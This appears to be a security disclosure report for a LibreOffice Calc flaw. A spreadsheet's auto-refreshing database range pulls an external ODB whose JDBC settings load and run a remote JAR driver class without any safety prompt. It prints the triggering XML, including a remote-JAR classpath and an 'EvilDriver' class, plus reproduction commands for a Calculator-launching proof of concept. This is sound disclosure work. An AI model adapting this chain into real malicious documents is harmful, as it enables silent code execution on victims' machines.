# LibreOffice Calc Database Range JDBC Classpath Code Execution Without Active-Content Warning

## Summary

LibreOffice Calc can be made to load and instantiate attacker-controlled Java bytecode when a spreadsheet contains an auto-refreshing database range that points to an external `.odb` database document. This happens without a safety prompt or active-content warning comparable to the warning LibreOffice shows before running macros.

Tracked as [CVE-2026-63277](https://www.libreoffice.org/security/); fixed in LibreOffice 26.2.5 and 26.8.0.

The spreadsheet itself is an `.ods` file. Its database range references an external ODB URL. When Calc refreshes the range, LibreOffice resolves that ODB as a database source. The ODB can define JDBC driver settings, including `JavaDriverClass` and `JavaDriverClassPath`. If the classpath points to a remote JAR, LibreOffice loads the JAR and instantiates the named JDBC driver class.

The security issue is that opening a spreadsheet can cross from passive document handling into code execution without first asking the user to trust the document. A user would normally expect a macro-style safety popup before document-supplied content is allowed to execute code.

## Impact

Opening a malicious spreadsheet can execute attacker-controlled Java code in the LibreOffice process context when Java/JDBC support is available, without first showing the user a macro-style safety prompt.

The proof of concept uses a JDBC driver that launches Calculator, but the primitive is arbitrary Java bytecode execution through a loaded driver class.

## Vulnerability Details

The ODS contains a persisted Calc database range with an automatic refresh delay. The range's database source is a URL to an ODB document:

```xml
<table:database-range
  table:name="Import1"
  table:target-range-address="Sheet1.A3:Sheet1.B8"
  table:contains-header="false"
  table:refresh-delay="PT1S">
  <table:database-source-sql
    table:database-name="http://127.0.0.1:8000/poc-calculator.odb"
    table:sql-statement="SELECT 1"/>
</table:database-range>
```

The referenced ODB defines JDBC settings that point LibreOffice at a Java driver class and an external JAR:

```xml
<db:driver-settings
  db:java-driver-class="EvilDriver"
  db:java-classpath="jar:http://127.0.0.1:8000/evil-calculator-driver.jar!/"/>
```

When the database range refreshes, LibreOffice follows this chain:

```text
Open ODS
  -> Calc restores the persisted database range
  -> database range refresh runs
  -> Calc creates a com.sun.star.sdb.RowSet
  -> RowSet resolves the URL-like DataSourceName through DatabaseContext
  -> DatabaseContext loads the external ODB
  -> ODB JDBC settings provide JavaDriverClass and JavaDriverClassPath
  -> Java classpath handling accepts jar:http://...!/ URLs
  -> LibreOffice loads the remote JAR and instantiates the driver class
```

The security issue is the composition of these individually supported features without an active-content trust decision. A spreadsheet-controlled refresh can reach Java class loading using settings supplied by another document fetched from a spreadsheet-controlled URL, yet the user is not shown a safety popup before that code-loading path is used.

Relevant source areas:

```text
sc/source/filter/xml/xmldrani.cxx
sc/source/ui/docshell/docsh5.cxx
sc/source/ui/docshell/dbdocimp.cxx
dbaccess/source/core/api/RowSet.cxx
dbaccess/source/filter/xml/xmlDataSource.cxx
connectivity/source/drivers/jdbc/JConnection.cxx
jvmaccess/source/classpath.cxx
```

## Proof of Concept Files

The submission directory is organized as follows:

```text
.
|-- README.md
|-- REPORT.md
|-- build_payloads.py
|-- hosted_artifacts/
|   |-- evil-calculator-driver.jar
|   `-- poc-calculator.odb
|-- payloads/
|   |-- onefile-dbrange-http.fods
|   `-- onefile-dbrange-http.ods
|-- src/
|   `-- EvilDriver.java
`-- video/
    `-- ubuntu_demo.mp4
```

`build_payloads.py` regenerates the spreadsheet, the external ODB, and the JDBC driver JAR for a chosen host URL.

`payloads/onefile-dbrange-http.ods` is the spreadsheet opened in LibreOffice Calc. It contains the auto-refreshing database range that points to the external ODB. `payloads/onefile-dbrange-http.fods` is the generated flat-XML form of the same spreadsheet content and is useful for inspection.

`hosted_artifacts/poc-calculator.odb` and `hosted_artifacts/evil-calculator-driver.jar` are the files served over HTTP. The ODB supplies the JDBC settings, and the JAR contains the demonstration driver class.

`src/EvilDriver.java` is the source for the demonstration JDBC driver. It attempts to launch Calculator once when LibreOffice loads or instantiates the driver.

`video/ubuntu_demo.mp4` is a PoC video showing the behavior on Ubuntu.

## Reproduction

For the local reproduction below, the HTTP server runs on localhost on the same machine that runs LibreOffice. This is only to make the PoC easy to run and independent of the reporter's network setup. Localhost is not required for the vulnerability: in an in-the-wild attack, the ODS would reference ODB and JAR URLs hosted on an attacker-controlled remote server.

The reproduction requires LibreOffice with Java support enabled and a Java toolchain available to build the demonstration driver JAR.

1. Generate the ODS, ODB, and JAR for localhost:

   ```bash
   python3 build_payloads.py --host-url http://127.0.0.1:8000
   ```

2. Serve the generated ODB and JAR on the same machine that will open the spreadsheet:

   ```bash
   cd hosted_artifacts
   python3 -m http.server 8000 --bind 127.0.0.1
   ```

3. Keep the HTTP server running. In another terminal, from the repository root, open the generated spreadsheet in LibreOffice Calc:

   ```bash
   libreoffice payloads/onefile-dbrange-http.ods
   ```

4. Observe HTTP requests for the external ODB and JAR:

   ```text
   GET /poc-calculator.odb
   GET /evil-calculator-driver.jar
   ```

5. Observe that LibreOffice loads and instantiates `EvilDriver` without showing a macro-style safety warning or active-content prompt. The provided demonstration driver attempts to launch Calculator (`calc.exe` on Windows, Calculator on macOS, or `xcalc` on Linux).

## Expected Security Behavior

Opening a spreadsheet should not silently load and instantiate Java classes from a classpath supplied through document-controlled database settings.

This behavior should require an explicit trust decision before code is loaded, comparable to the safety popup shown for macros or other executable document features.

## Tested Versions

Confirmed on:

```text
Linux:
  LibreOffice 24.2.7.2 420(Build:2)
  Ubuntu package family 4:24.2.7-0ubuntu0.24.04.5
  Ubuntu 24.04 x86_64
  Required Ubuntu packages for JDBC/Java support:
    default-jre
    libreoffice-base
    libreoffice-base-core
    libreoffice-base-drivers
    libreoffice-calc
    libreoffice-java-common
    ure-java

Windows:
  LibreOffice 26.2.4.2, build 26200
  Required Windows setup:
    standard LibreOffice installation
    compatible JRE available to LibreOffice
```

The issue is not expected to be platform-specific. The trigger chain is in LibreOffice document/database handling plus Java classpath loading.

Java support must be installed and usable by LibreOffice.
